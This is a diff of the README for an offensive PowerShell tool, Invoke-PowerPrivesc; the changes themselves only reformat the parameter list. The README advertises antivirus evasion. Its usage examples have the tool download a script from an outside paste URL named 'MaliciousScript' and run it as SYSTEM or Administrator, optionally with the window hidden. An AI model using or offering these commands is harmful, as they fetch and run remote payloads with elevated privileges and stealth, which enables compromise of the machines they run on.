@@ -27,22 +27,24 @@ And also,dont even worry of your script is getting caught by AVs,we take care of
 # Usage
 After importing the script with `Import-Module` or invoke the script with `.\Invoke-PowerPrivesc.ps1` or *invoking it remotely*,this is the options you have
 ```
-PARAMETER ScriptLink
+PARAMETER 
+- ScriptLink
 The link that goes into the script
-PARAMETER ToPrivilege
+- ToPrivilege
 The privilege you want,it can be Administrator or SYSTEM
-SWITCH HideWindow
+SWITCH 
+- HideWindow
 Use the switch to hide Powershell windows,By default,this tool shows the window
 EXAMPLE
 Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege SYSTEM -HideWindow
 Description
 -----------
 Run the Script as SYSTEM with window hidden
-EXAMPLE
+--------------------------------------------------------------------------------------------------------
 Invoke-PowerPrivesc -ScriptLink https://paste.c-net.org/MaliciousScript -ToPrivilege Administrator
 Description
 -----------
 Run the Script as Administrator with window not hidden
 ```
  # To-do List
-- Fix -HideWindows switch
+- Fix -HideWindows switch feature
